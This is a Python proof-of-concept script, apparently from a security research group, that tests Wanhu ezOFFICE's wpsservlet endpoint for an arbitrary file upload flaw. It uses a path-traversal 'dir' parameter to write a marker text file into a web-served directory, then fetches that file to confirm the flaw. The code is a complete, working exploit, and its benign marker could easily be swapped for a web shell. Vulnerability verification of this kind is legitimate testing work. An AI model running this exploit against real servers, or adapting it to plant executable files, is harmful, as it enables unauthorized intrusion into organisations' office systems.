#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import random
import string
import sys


def verify(target_url):
    """
    检测万户 ezOFFICE wpsservlet 接口的任意文件上传漏洞
    :param target_url: 目标 URL（例如：http://example.com）
    """
    try:
        # 构造请求 URL 和文件路径
        upload_url = f"{target_url}/defaultroot/wpsservlet?option=saveNewFile&newdocId=cnvd&dir=../platform/portal/layout/&fileType=.txt"
        file_url = f"{target_url}/defaultroot/platform/portal/layout/cnvd.txt"

        # 请求头
        headers = {
            "Host": target_url.split("//")[1].split("/")[0],
            "Accept-Encoding": "gzip",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
            "Cache-Control": "max-age=0",
            "Content-Type": "multipart/form-data; boundary=803e058d60f347f7b3c17fa95228eca6",
        }

        # 请求体
        body = (
            "--803e058d60f347f7b3c17fa95228eca6\r\n"
            'Content-Disposition: form-data; name="NewFile"; filename="cnvd.txt"\r\n\r\n'
            "www.cnvd.org.cn\r\n"
            "--803e058d60f347f7b3c17fa95228eca6--\r\n"
        )

        # 发送 POST 请求上传文件
        print(f"[*] Uploading file to: {upload_url}")
        response_upload = requests.post(upload_url, headers=headers, data=body, timeout=10)
        print(f"[*] Upload response status code: {response_upload.status_code}")

        # 发送 GET 请求访问上传的文件
        print(f"[*] Accessing file at: {file_url}")
        response_file = requests.get(file_url, headers=headers, timeout=10)
        print(f"[*] File access response status code: {response_file.status_code}")

        # 检查漏洞是否存在
        if response_file.status_code == 200 and "www.cnvd.org.cn" in response_file.text:
            print("[+] Vulnerability detected! File uploaded and accessed successfully.")
            return file_url
        else:
            print("[-] No vulnerability detected.")

    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
    return False
    
if __name__=="__main__":
    target = sys.argv[1]
    data = verify(target)
    if data:
        print("[+]漏洞存在，上传后的图片路径为：", data)
    else:
        print("[-]漏洞不存在")
